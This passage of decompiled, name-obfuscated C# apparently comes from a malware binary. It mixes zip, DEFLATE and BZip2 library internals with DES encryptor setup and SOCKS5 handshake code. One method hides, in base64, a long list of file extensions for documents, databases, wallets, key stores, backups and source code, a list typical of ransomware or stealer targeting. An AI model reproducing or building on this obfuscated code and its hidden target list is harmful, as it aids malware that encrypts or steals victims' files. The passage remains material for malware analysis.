					num6 = ((num5 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
					if (int_0 != 0)
					{
						class42_0.int_0 = ((int_0 == 1) ? 7 : 9);
						break;
					}
				}
				class42_0.int_4 = class42_0.byte_0;
				class42_0.int_2 = class42_0.int_8;
				class42_0.int_3 = class42_0.int_9;
				class42_0.int_0 = 1;
				goto case 1;
			default:
				int_0 = -2;
				class40_0.int_9 = num;
				class40_0.int_8 = num2;
				gclass2_.int_1 = num4;
				gclass2_.long_0 += num3 - gclass2_.int_0;
				gclass2_.int_0 = num3;
				class40_0.int_13 = num5;
				return Class6.smethod_639(class40_0, -2);
			case 7:
				if (num2 > 7)
				{
					num2 -= 8;
					num4++;
					num3--;
				}
				class40_0.int_13 = num5;
				int_0 = Class6.smethod_639(class40_0, int_0);
				num5 = class40_0.int_13;
				num6 = ((num5 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
				if (class40_0.int_12 != class40_0.int_13)
				{
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					return Class6.smethod_639(class40_0, int_0);
				}
				class42_0.int_0 = 8;
				goto case 8;
			case 8:
				int_0 = 1;
				class40_0.int_9 = num;
				class40_0.int_8 = num2;
				gclass2_.int_1 = num4;
				gclass2_.long_0 += num3 - gclass2_.int_0;
				gclass2_.int_0 = num3;
				class40_0.int_13 = num5;
				return Class6.smethod_639(class40_0, 1);
			case 9:
				int_0 = -3;
				class40_0.int_9 = num;
				class40_0.int_8 = num2;
				gclass2_.int_1 = num4;
				gclass2_.long_0 += num3 - gclass2_.int_0;
				gclass2_.int_0 = num3;
				class40_0.int_13 = num5;
				return Class6.smethod_639(class40_0, -3);
			}
		}
	}

	static void smethod_527()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static int smethod_528(Class43 class43_0)
	{
		if (class43_0.class40_0 != null)
		{
			Class6.smethod_513(class43_0.class40_0);
		}
		class43_0.class40_0 = null;
		return 0;
	}

	static void smethod_529(Stream3 stream3_0, byte[] byte_0, int int_0, int int_1)
	{
		for (int i = 0; i < int_1; i++)
		{
			byte_0[int_0 + i] = (byte)(stream3_0.byte_1[i] ^ byte_0[int_0 + i]);
		}
	}

	static GClass0 smethod_530(string string_0, byte[] byte_0, GClass1 gclass1_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentException("bad argument", "byteContent");
		}
		MemoryStream stream_ = new MemoryStream(byte_0);
		return Class6.smethod_479((Stream)stream_, string_0, gclass1_0);
	}

	static void smethod_531(Class54 class54_0, int int_0)
	{
		class54_0.int_0 = int_0;
	}

	static int smethod_532(Stream6 stream6_0, int int_0)
	{
		int num = stream6_0.int_4;
		int num2 = stream6_0.int_3;
		if (num < int_0)
		{
			do
			{
				int num3 = stream6_0.stream_0.ReadByte();
				if (num3 >= 0)
				{
					num2 = (num2 << 8) | num3;
					num += 8;
					continue;
				}
				throw new IOException("unexpected end of stream");
			}
			while (num < int_0);
			stream6_0.int_3 = num2;
		}
		stream6_0.int_4 = num - int_0;
		return (num2 >> num - int_0) & ((1 << int_0) - 1);
	}

	static bool smethod_533(string string_0, GClass0 gclass0_0, [Out] Stream stream_0, ref string string_1)
	{
		if (string_0 != null)
		{
			string text = gclass0_0.string_1.Replace("\\", "/");
			if (text.IndexOf(':') == 1)
			{
				text = text.Substring(2);
			}
			if (text.StartsWith("/"))
			{
				text = text.Substring(1);
			}
			if (gclass0_0.class8_0.gclass1_0.FlattenFoldersOnExtract)
			{
				string_1 = Path.Combine(string_0, (text.IndexOf('/') != -1) ? Path.GetFileName(text) : text);
			}
			else
			{
				string_1 = Path.Combine(string_0, text);
			}
			string_1 = string_1.Replace("/", "\\");
			if (!gclass0_0.bool_4 && !gclass0_0.string_1.EndsWith("/"))
			{
				return false;
			}
			if (!Directory.Exists(string_1))
			{
				Directory.CreateDirectory(string_1);
				Class6.smethod_110(bool_0: false, gclass0_0, string_1);
			}
			else if (gclass0_0.ExtractExistingFile == Enum3.const_1)
			{
				Class6.smethod_110(bool_0: false, gclass0_0, string_1);
			}
			return true;
		}
		if (stream_0 != null)
		{
			string_1 = null;
			if (!gclass0_0.bool_4 && !gclass0_0.string_1.EndsWith("/"))
			{
				return false;
			}
			return true;
		}
		throw new ArgumentNullException("outstream");
	}

	static string smethod_534(ZipSegmentedStream zipSegmentedStream_0)
	{
		return zipSegmentedStream_0.string_3;
	}

	static void smethod_535(Stream11 stream11_0, int int_0)
	{
		if (int_0 < 1024)
		{
			throw new ArgumentOutOfRangeException("BufferSize", "BufferSize must be greater than 1024 bytes");
		}
		stream11_0.int_3 = int_0;
	}

	static Class21 smethod_536(string string_0)
	{
		Class21 @class = new Class21();
		if (string_0 == null)
		{
			throw new BadPasswordException("This entry requires a password.");
		}
		Class6.smethod_478(@class, string_0);
		return @class;
	}

	static void smethod_537(Class73.Class76 class76_0, int int_0)
	{
		if (class76_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class76_0.byte_0[class76_0.int_0++] = (byte)int_0;
		class76_0.int_0 &= 32767;
	}

	static int smethod_538(Class19 class19_0)
	{
		return class19_0.int_0 / 8 / 2 + 10 + 2;
	}

	static ICryptoTransform smethod_539(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static GClass0 smethod_540(string string_0, GClass1 gclass1_0)
	{
		GClass0 gClass = Class6.smethod_551(string_0);
		gClass.class8_0 = new Class8(gclass1_0);
		Class6.smethod_498(gClass);
		gClass.AlternateEncoding = gclass1_0.encoding_0;
		gClass.AlternateEncodingUsage = gclass1_0.enum9_0;
		DateTime now = DateTime.Now;
		DateTime now2 = DateTime.Now;
		DateTime now3 = DateTime.Now;
		Class6.smethod_520(now, now3, now2, gClass);
		gClass.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
		gClass.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
		gClass.enum0_0 = Enum0.const_2;
		Class6.smethod_577(gClass.string_1, gclass1_0, gClass);
		Class6.smethod_215(gClass, gclass1_0);
		return gClass;
	}

	static void smethod_541(string string_0, GClass1 gclass1_0, Enum3 enum3_0)
	{
		gclass1_0.ExtractExistingFile = enum3_0;
		gclass1_0.method_1(string_0, bool_18: true);
	}

	static void smethod_542(Stream stream_0, GClass0 gclass0_0)
	{
		Stream4 stream = stream_0 as Stream4;
		ZipSegmentedStream zipSegmentedStream = stream_0 as ZipSegmentedStream;
		bool flag = false;
		do
		{
			try
			{
				if (gclass0_0.enum0_0 == Enum0.const_3 && !gclass0_0.bool_7)
				{
					Class6.smethod_353(gclass0_0, stream_0);
					break;
				}
				if (gclass0_0.bool_4)
				{
					Class6.smethod_290(gclass0_0, stream_0, 1);
					Class6.smethod_425(gclass0_0);
					gclass0_0.nullable_1 = gclass0_0.long_4 >= 4294967295L;
					gclass0_0.nullable_2 = Class6.smethod_598(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value;
					if (zipSegmentedStream != null)
					{
						gclass0_0.uint_0 = zipSegmentedStream.uint_0;
					}
					break;
				}
				bool flag2 = true;
				int num = 0;
				do
				{
					num++;
					Class6.smethod_290(gclass0_0, stream_0, num);
					Class6.smethod_511(stream_0, gclass0_0);
					Class6.smethod_264(gclass0_0, stream_0);
					gclass0_0.long_6 = gclass0_0.int_3 + gclass0_0.long_1 + gclass0_0.int_4;
					flag2 = num <= 1 && stream_0.CanSeek && Class6.smethod_232(gclass0_0);
					if (flag2)
					{
						if (zipSegmentedStream != null)
						{
							uint uint_ = gclass0_0.uint_0;
							long long_ = gclass0_0.long_4;
							Class6.smethod_553(uint_, zipSegmentedStream, long_);
						}
						else
						{
							stream_0.Seek(gclass0_0.long_4, SeekOrigin.Begin);
						}
						stream_0.SetLength(stream_0.Position);
						if (stream != null)
						{
							Class6.smethod_117(gclass0_0.long_6, stream);
						}
					}
				}
				while (flag2);
				gclass0_0.bool_9 = false;
				flag = true;
			}
			catch (Exception ex)
			{
				Enum1 zipErrorAction = gclass0_0.ZipErrorAction;
				int num2 = 0;
				while (true)
				{
					if (gclass0_0.ZipErrorAction != 0)
					{
						if (gclass0_0.ZipErrorAction != Enum1.const_1 && gclass0_0.ZipErrorAction != Enum1.const_2)
						{
							if (num2 <= 0)
							{
								if (gclass0_0.ZipErrorAction == Enum1.const_3)
								{
									Class6.smethod_323(ex, gclass0_0);
									if (gclass0_0.bool_12)
									{
										flag = true;
										break;
									}
								}
								num2++;
								continue;
							}
							throw;
						}
						long num3 = ((stream != null) ? Class6.smethod_452(stream) : stream_0.Position);
						long num4 = num3 - gclass0_0.long_5;
						if (num4 > 0L)
						{
							stream_0.Seek(num4, SeekOrigin.Current);
							long position = stream_0.Position;
							stream_0.SetLength(stream_0.Position);
							if (stream != null)
							{
								Class6.smethod_117(num3 - position, stream);
							}
						}
						if (gclass0_0.ZipErrorAction == Enum1.const_1)
						{
							Class6.smethod_288(gclass0_0, "Skipping file {0} (exception: {1})", new object[2]
							{
								gclass0_0.string_0,
								ex.ToString()
							});
							gclass0_0.bool_9 = true;
							flag = true;
						}
						else
						{
							gclass0_0.ZipErrorAction = zipErrorAction;
						}
						break;
					}
					throw;
				}
			}
		}
		while (!flag);
	}

	static bool smethod_543(GClass0 gclass0_0, string string_0, GClass1 gclass1_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 eventArgs = Class6.smethod_181(string_0, gclass0_0, gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_9 = true;
			}
		}
		return gclass1_0.bool_9;
	}

	static byte[] smethod_544(Stream12 stream12_0)
	{
		if (stream12_0.byte_0 == null)
		{
			stream12_0.byte_0 = new byte[stream12_0.int_0];
		}
		return stream12_0.byte_0;
	}

	static long smethod_545(string string_0)
	{
		if (!File.Exists(string_0))
		{
			throw new FileNotFoundException(string_0);
		}
		long num = 0L;
		using FileStream fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
		return fileStream.Length;
	}

	static ICollection<GClass0> smethod_546(GClass1 gclass1_0, string string_0)
	{
		Class16 class16_ = new Class16(string_0, gclass1_0.AddDirectoryWillTraverseReparsePoints);
		return Class6.smethod_94(class16_, gclass1_0);
	}

	static byte[] smethod_547(Class60 class60_0)
	{
		return class60_0.byte_0;
	}

	static GClass1 smethod_548(Stream stream_0)
	{
		return Class6.smethod_665(stream_0, (TextWriter)null, (Encoding)null, (EventHandler<EventArgs1>)null);
	}

	static void smethod_549(GClass1 gclass1_0)
	{
		EventHandler<EventArgs3> eventHandler_ = gclass1_0.eventHandler_0;
		if (eventHandler_ != null)
		{
			EventArgs3 eventArgs = Class6.smethod_324(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_8 = true;
			}
		}
	}

	static EventArgs4 smethod_550(GClass0 gclass0_0, long long_0, long long_1, string string_0)
	{
		EventArgs4 eventArgs = new EventArgs4(string_0, Enum6.const_20);
		eventArgs.string_0 = string_0;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.long_0 = long_1;
		eventArgs.long_1 = long_0;
		return eventArgs;
	}

	static GClass0 smethod_551(string string_0)
	{
		return Class6.smethod_597((object)null, string_0, Enum0.const_0, (object)null);
	}

	static byte[] smethod_552(long long_0, long long_1, int int_0, uint uint_0)
	{
		byte[] array = new byte[76];
		int num = 0;
		byte[] bytes = BitConverter.GetBytes(101075792u);
		Array.Copy(bytes, 0, array, 0, 4);
		num = 4;
		Array.Copy(BitConverter.GetBytes(44L), 0, array, 4, 8);
		num = 12;
		num = 13;
		array[12] = 45;
		num = 14;
		array[13] = 0;
		num = 15;
		array[14] = 45;
		num = 16;
		array[15] = 0;
		for (int i = 0; i < 8; i++)
		{
			array[num++] = 0;
		}
		long value = int_0;
		Array.Copy(BitConverter.GetBytes(value), 0, array, num, 8);
		num += 8;
		Array.Copy(BitConverter.GetBytes(value), 0, array, num, 8);
		num += 8;
		long value2 = long_1 - long_0;
		Array.Copy(BitConverter.GetBytes(value2), 0, array, num, 8);
		num += 8;
		Array.Copy(BitConverter.GetBytes(long_0), 0, array, num, 8);
		num += 8;
		bytes = BitConverter.GetBytes(117853008u);
		Array.Copy(bytes, 0, array, num, 4);
		num += 4;
		uint value3 = ((uint_0 != 0) ? (uint_0 - 1) : 0u);
		Array.Copy(BitConverter.GetBytes(value3), 0, array, num, 4);
		num += 4;
		Array.Copy(BitConverter.GetBytes(long_1), 0, array, num, 8);
		num += 8;
		Array.Copy(BitConverter.GetBytes(uint_0), 0, array, num, 4);
		num += 4;
		return array;
	}

	static long smethod_553(uint uint_0, ZipSegmentedStream zipSegmentedStream_0, long long_0)
	{
		if (uint_0 >= 99)
		{
			throw new ArgumentOutOfRangeException("diskNumber");
		}
		if (zipSegmentedStream_0.rwMode_0 != ZipSegmentedStream.RwMode.Write)
		{
			zipSegmentedStream_0.bool_0 = true;
			throw new ZipException("bad state.");
		}
		if (uint_0 == zipSegmentedStream_0.uint_0)
		{
			return zipSegmentedStream_0.stream_0.Seek(long_0, SeekOrigin.Begin);
		}
		if (zipSegmentedStream_0.stream_0 != null)
		{
			zipSegmentedStream_0.stream_0.Dispose();
			if (File.Exists(zipSegmentedStream_0.string_3))
			{
				File.Delete(zipSegmentedStream_0.string_3);
			}
		}
		for (uint num = zipSegmentedStream_0.uint_0 - 1; num > uint_0; num--)
		{
			string path = Class6.smethod_571(zipSegmentedStream_0, num);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
		}
		Class6.smethod_395(zipSegmentedStream_0, uint_0);
		for (int i = 0; i < 3; i++)
		{
			try
			{
				zipSegmentedStream_0.string_3 = Class6.smethod_152();
				File.Move(Class6.smethod_649(zipSegmentedStream_0), zipSegmentedStream_0.string_3);
			}
			catch (IOException)
			{
				if (i == 2)
				{
					throw;
				}
				continue;
			}
			break;
		}
		zipSegmentedStream_0.stream_0 = new FileStream(zipSegmentedStream_0.string_3, FileMode.Open);
		return zipSegmentedStream_0.stream_0.Seek(long_0, SeekOrigin.Begin);
	}

	static void smethod_554(GClass0 gclass0_0)
	{
		Class6.smethod_497((string)null, (Stream)null, ".", gclass0_0);
	}

	static void smethod_555(int int_0, Class32 class32_0, int int_1)
	{
		Class6.smethod_291(class32_0.class31_0, 3, (uint)int_0);
		Class6.smethod_291(class32_0.class31_0, 15, (uint)int_1);
		byte[] byte_ = class32_0.class33_0.byte_2;
		for (int i = 0; i < int_1; i++)
		{
			int j = 0;
			for (int num = byte_[i] & 0xFF; j < num; j++)
			{
				Class6.smethod_291(class32_0.class31_0, 1, 1u);
			}
			Class6.smethod_291(class32_0.class31_0, 1, 0u);
		}
	}

	static void smethod_556(Class61 class61_0, string string_0)
	{
		class61_0.string_1 = string_0;
	}

	static byte[] smethod_557(Class59 class59_0)
	{
		byte[] array = new byte[3 + Class6.smethod_156(class59_0).Length + Class6.smethod_87(class59_0).Length];
		array[0] = 1;
		array[1] = (byte)Class6.smethod_156(class59_0).Length;
		Array.Copy(Encoding.ASCII.GetBytes(Class6.smethod_156(class59_0)), 0, array, 2, Class6.smethod_156(class59_0).Length);
		array[Class6.smethod_156(class59_0).Length + 2] = (byte)Class6.smethod_87(class59_0).Length;
		Array.Copy(Encoding.ASCII.GetBytes(Class6.smethod_87(class59_0)), 0, array, Class6.smethod_156(class59_0).Length + 3, Class6.smethod_87(class59_0).Length);
		return array;
	}

	static void smethod_558(Class56 class56_0, byte[] byte_0)
	{
		switch (byte_0[3])
		{
		case 1:
			class56_0.byte_0 = new byte[5];
			break;
		default:
			throw new ProtocolViolationException();
		case 3:
			class56_0.byte_0 = new byte[byte_0[4] + 2];
			break;
		case 4:
			byte_0 = new byte[17];
			break;
		}
		class56_0.int_0 = 0;
		Class6.smethod_595((Class54)class56_0).BeginReceive(Class6.smethod_315((Class54)class56_0), 0, Class6.smethod_315((Class54)class56_0).Length, SocketFlags.None, class56_0.method_6, Class6.smethod_595((Class54)class56_0));
	}

	static int smethod_559(Enum21 enum21_0, int int_0, GClass2 gclass2_0, Enum20 enum20_0, Class38 class38_0)
	{
		return Class6.smethod_564(int_0, class38_0, gclass2_0, enum20_0, Class38.int_1, enum21_0);
	}

	static void smethod_560(Class32.Class33 class33_0, int int_0, Class32 class32_0, int int_1, int int_2)
	{
		int[] int_3 = class33_0.int_4;
		int[] int_4 = class33_0.int_5;
		int[] int_5 = class33_0.int_6;
		int[] int_6 = class33_0.int_13;
		byte[] byte_ = class33_0.byte_6;
		int_3[0] = int_1;
		int_4[0] = int_2;
		int_5[0] = int_0;
		int num = 1;
		while (--num >= 0)
		{
			int num2 = int_3[num];
			int num3 = int_4[num];
			int num4 = int_5[num];
			if (num3 - num2 >= Class32.int_13 && num4 <= Class32.int_14)
			{
				int num5 = num4 + 1;
				byte byte_2 = byte_[int_6[num2] + num5];
				byte byte_3 = byte_[int_6[num3] + num5];
				byte byte_4 = byte_[int_6[num2 + num3 >> 1] + num5];
				int num6 = Class6.smethod_184(byte_3, byte_2, byte_4) & 0xFF;
				int num7 = num2;
				int num8 = num3;
				int num9 = num2;
				int num10 = num3;
				while (true)
				{
					if (num7 <= num8)
					{
						int num11 = (byte_[int_6[num7] + num5] & 0xFF) - num6;
						if (num11 == 0)
						{
							int num12 = int_6[num7];
							int_6[num7++] = int_6[num9];
							int_6[num9++] = num12;
							continue;
						}
						if (num11 < 0)
						{
							num7++;
							continue;
						}
					}
					while (num7 <= num8)
					{
						int num13 = (byte_[int_6[num8] + num5] & 0xFF) - num6;
						if (num13 == 0)
						{
							int num14 = int_6[num8];
							int_6[num8--] = int_6[num10];
							int_6[num10--] = num14;
							continue;
						}
						if (num13 <= 0)
						{
							break;
						}
						num8--;
					}
					if (num7 > num8)
					{
						break;
					}
					int num15 = int_6[num7];
					int_6[num7++] = int_6[num8];
					int_6[num8--] = num15;
				}
				if (num10 < num9)
				{
					int_3[num] = num2;
					int_4[num] = num3;
					int_5[num] = num5;
					num++;
					continue;
				}
				int num16 = ((num9 - num2 < num7 - num9) ? (num9 - num2) : (num7 - num9));
				Class6.smethod_24(num16, int_6, num2, num7 - num16);
				int num17 = ((num3 - num10 < num10 - num8) ? (num3 - num10) : (num10 - num8));
				Class6.smethod_24(num17, int_6, num7, num3 - num17 + 1);
				num16 = num2 + num7 - num9 - 1;
				num17 = num3 - (num10 - num8) + 1;
				int_3[num] = num2;
				int_4[num] = num16;
				int_5[num] = num4;
				num++;
				int_3[num] = num16 + 1;
				int_4[num] = num17 - 1;
				int_5[num] = num5;
				num++;
				int_3[num] = num17;
				int_4[num] = num3;
				int_5[num] = num4;
				num++;
			}
			else if (Class6.smethod_239(class32_0, class33_0, num2, num3, num4))
			{
				break;
			}
		}
	}

	static IEnumerable<string> smethod_561()
	{
		Regex regex = new Regex(",");
		return regex.Split(Encoding.UTF8.GetString(Convert.FromBase64String("LjFjZCwuM2QsLjNkNCwuM2RmOCwuM2RtLC4zZHMsLjNmciwuM2cyLC4zZ3AsLjNncDIsLjNtbSwuM3ByLC43eiwuN3ppcCwuYWFjLC5hYjQsLmFiaywuYWJ3LC5hYzMsLmFjY2RiLC5hY2NkZSwuYWNjZHIsLmFjY2R0LC5hY2UsLmFjaCwuYWNyLC5hY3QsLmFkYiwuYWRlLC5hZGksLmFkcCwuYWRwYiwuYWRyLC5hZHMsLmFkdCwuYWdkbCwuYWksLmFpZmYsLmFpbSwuYWlwLC5haXMsLmFpdCwuYWwsLmFtZiwuYW1yLC5hbXUsLmFteCwuYW14eCwuYW5zLC5hb2ksLmFwLC5hcGUsLmFwaSwuYXBqLC5hcmMsLmFyaSwuYXJqLC5hcm8sLmFyciwuYXJ3LC5hc2EsLmFzYywuYXNjeCwuYXNlLC5hc2YsLmFzaHgsLmFzbSwuYXNteCwuYXNwLC5hc3B4LC5hc3IsLmFzeCwuYXZpLC5hdnMsLmF3ZywuYmFjaywuYmFja3VwLC5iYWNrdXBkYiwuYmFrLC5iYW5rLC5iYXksLmJjaywuYmRiLC5iZHAsLmJkciwuYmd0LC5iaWIsLmJpYywuYmlnLC5iaWssLmJpbiwuYmtmLC5ia3AsLmJsZW5kLC5ibHAsLmJtYywuYm1mLC5ibWwsLmJtcCwuYm9jLC5icDIsLmJwMywuYnBsLC5icHcsLmJzcCwuYywuY2FnLC5jYW0sLmNhcCwuY2FyLC5jYnIsLmNieiwuY2MsLmNjZCwuY2NoLC5jZCwuY2RmLC5jZHIsLmNkcjMsLmNkcjQsLmNkcjUsLmNkcjYsLmNkcncsLmNkeCwuY2UxLC5jZTIsLmNlciwuY2ZnLC5jZ2YsLmNnbSwuY2hrLC5jaWIsLmNsYXNzLC5jbHIsLmNscywuY21zLC5jbXQsLmNvZCwuY29sLC5jb25maWcsLmNvbnRhY3QsLmNwLC5jcGksLmNwcCwuY3IyLC5jcmF3LC5jcmQsLmNydCwuY3J3LC5jcywuY3NoLC5jc2ksLmNzbCwuY3NvLC5jc3MsLmNzdiwuY3R0LC5jdHksLmN3ZiwuZGFjLC5kYWwsLmRhcCwuZGF0LC5kYiwuZGIzLC5kYl9qb3VybmFsLC5kYmIsLmRiZiwuZGJ4LC5kYzIsLmRjcCwuZGNyLC5kY3MsLmRjdSwuZGRjLC5kZGN4LC5kZGQsLmRkb2MsLmRkcncsLmRkcywuZGVtLC5kZXIsLmRlcywuZGVzaWduLC5kZXYsLmRleCwuZGdjLC5kaWMsLmRpZiwuZGlpLC5kaXIsLmRpc2ssLmRpdCwuZGl2eCwuZGl6LC5kanZ1LC5kbWcsLmRuZywuZG9iLC5kb2MsLmRvY20sLmRvY3gsLmRvdCwuZG90bSwuZG90eCwuZG94LC5kcGssLmRwbCwuZHByLC5kcmYsLmRydywuZHNrLC5kc3AsLmR0ZCwuZHZkLC5kdmksLmR2eCwuZHdnLC5keGIsLmR4ZSwuZHhmLC5keGcsLmVkYiwuZWxmLC5lbWwsLmVwcywuZXFsLC5lcmJzcWwsLmVyZiwuZXJyLC5ldWMsLmV2bywuZXgsLmV4ZiwuZXhpZiwuZjkwLC5mYXEsLmZjZCwuZmRiLC5mZHIsLmZkcywuZmYsLmZmZCwuZmZmLC5maCwuZmhkLC5mbGEsLmZsYWMsLmZsZiwuZmxwLC5mbHYsLmZsdnYsLmZvciwuZnBwLC5mcHgsLmZ4ZywuZ2FtLC5naWYsLmdyYXksLmdyZXksLmdyZiwuZ3JvdXBzLC5ncnksLmd0aHIsLmd6LC5nemlnLC5oLC5oM20sLmg0ciwuaGJrLC5oZGQsLmhwcCwuaHRtLC5odG1sLC5pYmFuaywuaWJkLC5pYnosLmlkeCwuaWlmLC5paXEsLmltZywuaW5jcGFzLC5pbmRkLC5pbmssLmlwYSwuaXN1LC5pc3osLml0ZGIsLml0bCwuaXdkLC5qYXIsLmphdiwuamF2YSwuamMsLmpmaWYsLmpneiwuamlmLC5qaWZmLC5qbnQsLmpwYywuanBlLC5qcGVnLC5qcGYsLmpwZywuanB3LC5qcywua2MyLC5rZGJ4LC5rZGMsLmtleSwua216LC5rcGR4LC5rd2QsLmt3bSwubGFjY2RiLC5sYmksLmxjZCwubGNmLC5sZGIsLmxkZiwubGdwLC5saXQsLmxvZywubHAyLC5sdG0sLmx0ciwubHVhLC5sdmwsLm0sLm0ydHMsLm0zdSwubTRwLC5tNHYsLm1hZywubWFuLC5tYXAsLm1hcGltYWlsLC5tYXgsLm1ib3gsLm1ieCwubWNkLC5tZCwubWQzLC5tZGIsLm1kYywubWRmLC5tZGwsLm1kbiwubWRzLC5tZWYsLm1mdywubWljLC5taWQsLm1pcCwubWt2LC5tbGIsLm1seCwubW13LC5tbnksLm1vZCwubW9uZXl3ZWxsLC5tb3MsLm1vdiwubW96LC5tcDMsLm1wNCwubXBlZywubXBnLC5tcncsLm1zZywubXNwLC5teHAsLm15ZCwubmF2LC5uY2QsLm5kLC5uZGQsLm5kZiwubmRzLC5uZWYsLm5mbywubmsyLC5ub3AsLm5vdywubnJnLC5ucmksLm5ydywubnMyLC5uczMsLm5zNCwubnNkLC5uc2YsLm5zZywubnNoLC5udnJhbSwubndiLC5ueDIsLm54bCwubnlmLC5vYWIsLm9iaiwub2RiLC5vZGMsLm9kZiwub2RnLC5vZGksLm9kbSwub2RwLC5vZHMsLm9kdCwub2Z0LC5vZ2EsLm9nZywub2lsLC5vcGYsLm9yZiwub3N0LC5vdGcsLm90aCwub3RwLC5vdHMsLm90dCwub3dsLC5veHQsLnAxMiwucDdiLC5wN2MsLnBhYiwucGFnZXMsLnBhaywucGFzLC5wYXQsLnBiZiwucGJwLC5wYnMsLnBjZCwucGN0LC5wY3YsLnBkYiwucGRkLC5wZGYsLnBlZiwucGVtLC5wZngsLnBocCwucGlmLC5wa2IsLnBraCwucGwsLnBsYywucGxpLC5wbHVzX211aGQsLnBtLC5wbmcsLnBvdCwucG90bSwucG90eCwucHBhbSwucHBkLC5wcGYsLnBwcywucHBzbSwucHBzeCwucHB0LC5wcHRtLC5wcHR4LC5wcmMsLnByZiwucHJ0LC5wcywucHNhLC5wc2FmZTMsLnBzZCwucHNwaW1hZ2UsLnB5LC5wc3QsLnB0eCwucHV6LC5wd2YsLnB3aSwucHdtLC5weHAsLnB5LC5xYmEsLnFiYiwucWJtLC5xYnIsLnFidywucWJ4LC5xYnksLnFjb3csLnFjb3cyLC5xZGYsLnFlZCwucWVsLC5xaWYsLnFweCwucXRxLC5xdHIsLnIzZCwucmEsLnJhZiwucmFyLC5yYXQsLnJhdywucmRiLC5yZXMsLnJldiwucmduLC5ybSwucm5nLC5ycnQsLnJzcmMsLnJzdywucnRlLC5ydGYsLnJ0cywucnR4LC5ydW0sLnJ1biwucnYsLnJ2dCwucncyLC5yd2wsLnJ3eiwuczNkYiwuc2FkLC5zYWYsLnNhZmUsLnNhczdiZGF0LC5zYXYsLnNhdmUsLnNheSwuc2NtLC5zY24sLnNjeCwuc2QwLC5zZGEsLnNkYiwuc2RjLC5zZGYsLnNkbiwuc2RzLC5zZHQsLnNlbiwuc2ZzLC5zZngsLnNoLC5zaGFyLC5zaHIsLnNodywuc2xkbSwuc2xkeCwuc2x0LC5zbnAsLnNvLC5zcHIsLnNxbCwuc3FsaXRlLC5zcWxpdGUzLC5zcWxpdGVkYiwuc3F4LC5zcjIsLnNyZiwuc3J0LC5zcncsLnNzYSwuc3Q0LC5zdDUsLnN0Niwuc3Q3LC5zdDgsLnN0Yywuc3RkLC5zdGksLnN0bSwuc3R0LC5zdHcsLnN0eCwuc3VkLC5zdmcsLnN2aSwuc3ZyLC5zd2QsLnN3Ziwuc3hjLC5zeGQsLnN4Zywuc3hpLC5zeG0sLnN4dywudGFyLC50YXgyMDEzLC50YXgyMDE0LC50YnoyLC50Y2gsLnRjeCwudGV4LC50eHQsLnRleHQsLnRnLC50Z2EsLnRobSwudGhteCwudGlmLC50bGcsLnRseiwudHB1LC50cHgsLnRycCwudHUsLnR1ciwudHhkLC50eGYsLnR4dCwudWF4LC51ZGYsLnVteCwudW5yLC51bngsLnVvcCwudXBvaSwudXJsLC51c2EsLnVzeCwudXQyLC51dDMsLnV0YywudXR4LC51dngsLnV4eCwudmFsLC52Ym94LC52YywudmNkLC52ZGksLnZkbywudmVyLC52aGQsLnZoZHgsLnZtZGssLnZtZiwudm1zZCwudm10LC52bXgsLnZteGYsLnZvYiwudnNpLC52dGYsLnczZywudzN4LC53YWIsLndhZCwud2FsbGV0LC53YXIsLndhdiwud2F2ZSwud2F3LC53YjIsLndiaywud2RndCwud2tzLC53bSwud21hLC53bWQsLndtZGIsLndtbXAsLndtdiwud214LC53b3csLndwZCwud3BrLC53cGwsLndwcywud3NoLC53dGQsLnd0Ziwud3Z4LC54MTEsLngzZiwueGlzLC54bCwueGxhLC54bGFtLC54bGMsLnhsaywueGxsLC54bG0sLnhsciwueGxzLC54bHNiLC54bHNtLC54bHN4LC54bHQsLnhsdG0sLnhsdHgsLnhsdiwueGx3LC54bHd4LC54bWwsLnhwaSwueHB0LC54dmlkLC54d2QsLnlhYiwueWNiY3JhLC55cHMsLnl1diwuejAyLC56MDQsLnphcCwuemlwLC56aXB4LC56b28sLnNheiwudGxw")));
	}

	static GClass0 smethod_562(Delegate1 delegate1_0, string string_0, Delegate2 delegate2_0)
	{
		return Class6.smethod_597((object)delegate1_0, string_0, Enum0.const_5, (object)delegate2_0);
	}

	static int smethod_563(string string_0, string string_1, GClass1 gclass1_0)
	{
		ICollection<GClass0> collection = Class6.smethod_76(string_0, string_1, gclass1_0);
		Class6.smethod_370(collection, gclass1_0);
		return collection.Count;
	}

	static int smethod_564(int int_0, Class38 class38_0, GClass2 gclass2_0, Enum20 enum20_0, int int_1, Enum21 enum21_0)
	{
		class38_0.gclass2_0 = gclass2_0;
		class38_0.gclass2_0.string_0 = null;
		if (int_0 >= 9 && int_0 <= 15)
		{
			if (int_1 < 1 || int_1 > Class38.int_0)
			{
				throw new GException0($"memLevel must be in the range 1.. {Class38.int_0}");
			}
			class38_0.gclass2_0.class38_0 = class38_0;
			class38_0.int_24 = int_0;
